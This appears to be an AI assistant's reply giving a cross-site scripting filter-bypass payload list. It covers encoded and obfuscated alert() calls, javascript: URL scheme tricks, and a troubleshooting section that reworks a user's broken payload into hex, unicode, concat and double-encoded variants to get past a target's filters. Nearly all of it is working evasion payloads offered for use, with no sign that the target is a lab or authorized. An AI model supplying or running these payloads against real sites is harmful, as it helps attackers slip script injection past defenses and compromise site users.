## 1. Alternative Functions (No alert string)
These payloads achieve execution by calling alternative browser popup or printing routines [1].
```
confirm(1)
prompt(1)
print()
confirm(origin)
prompt(document.domain)
```
## 2. String Manipulation & Encoding
These formats bypass basic keyword filters by reconstructing or decoding the word alert at runtime [1].
```
window['al'+'ert'](1)
window['al\x65rt'](1)
window['al\u0065rt'](1)
window['\x61\x6c\x65\x72\x74'](1)
window['\u0061\u006c\u0065\u0072\x74'](1)
Function('ale'+'rt(1)')()
Function('\x61\x6c\x65\x72\x74\x28\x31\x29')()
atob('YWxlcnQoMSk=')
eval(atob('YWxlcnQoMSk='))
```
## 3. Case Variation & Formatting
Useful against simple, case-sensitive signature filters.
```
Alert(1)
ALERT(1)
aLeRt(1)
window.ALERT(1)
```
## 4. Alternative Execution Contexts
These look completely different from standard functional calls to trick behavior-based logic.
```
[1].map(alert)
[1].forEach(alert)
setTimeout(alert,1)
setInterval(alert,1)

throw/alert/g
{onerror=alert};throw 1
```
## 5. URL Scheme & Protocol Tricks
If your target code uses window.location.href, use these variations to bypass simple URL scheme regex blocks [1].
```
javascript:alert(1)
JaVaScRiPt:alert(1)
javascript://%0Aalert(1)
javascript:%61%6c%65%72%74(1)
java%09script:alert(1)
javascript&#x3a;alert(1)
```
## 6. HTML Entity & Context-Specific Fuzzing
Use these if the input is being reflected into an HTML tag attribute (like onload or onerror).
```
alert&#40;1&#41;
alert`1`
alert(origin)
```
------------------------------
Your payload broke because of how URL handling specs interact with browser parameters.
When you passed %27al%27+%27ert%27, the website or your browser interpreted the literal + character as an URL-encoded space. When decoded, the + completely vanished, turning your concatenation into ['al' 'ert'], which is a syntax error in JavaScript and causes the script to crash instead of running.
To fix this, you must construct the word alert without using the + character or traditional quotes.
## 🚀 Payloads That Do Not Use +## 1. Template Literals (The Cleanest Trick)
JavaScript allows backticks (`) instead of standard quotes. You can use the ${} syntax to concatenate strings without a plus sign:
```
Javascript:window[`al`+`ert`](1)
```
(Wait, if your filter strips the literal + anyway, use the template directly inside the bracket evaluation):
```
Javascript:window[`alert`](1)
```
## 2. Built-in .concat() Method
The JavaScript string prototype has a native function specifically for merging strings without using mathematical operators:
```
Javascript:window['al'.concat('ert')](1)
```
## 3. Hexadecimal Escape Sequences
You can bypass string concatenation entirely by referencing the characters by their hexadecimal byte codes. The browser automatically resolves the hex values into the word alert at execution time:
```
Javascript:window['\x61\x6c\x65\x72\x74'](1)
```
## 4. Unicode Escape Sequences
Similar to hex encoding, unicode strings allow you to bypass both literal character string matching and plus signs completely:
```
Javascript:window['\u0061\u006c\u0065\u0072\u0074'](1)
```
## 5. Array Join Injection
You can split the target word into separate array elements and stitch them together using the .join() array controller:
```
Javascript:window[['al','ert'].join('')](1)
```
------------------------------
## 🛠️ How to Properly Double-Encode the + Sign
If you absolutely must use the + operator in your payload, you have to prevent the server/browser from treating it as a space.
A standard plus sign is encoded as %2B. If the target application decodes the URL parameter multiple times, you must double-encode it so it safely passes through the first layer as a literal plus sign:

* Literal character: +
* Single URL Encoded: %2B
* Double URL Encoded: %252B

Example Double-Encoded Payload:
```
Javascript:window[%27al%27%252B%27ert%27](1)
```
## Try the Hexadecimal (\x61\x6c\x65\x72\x74) payload first, as it completely side-steps the encoding conflict altogether. Let me know if the console prints a different parsing error!
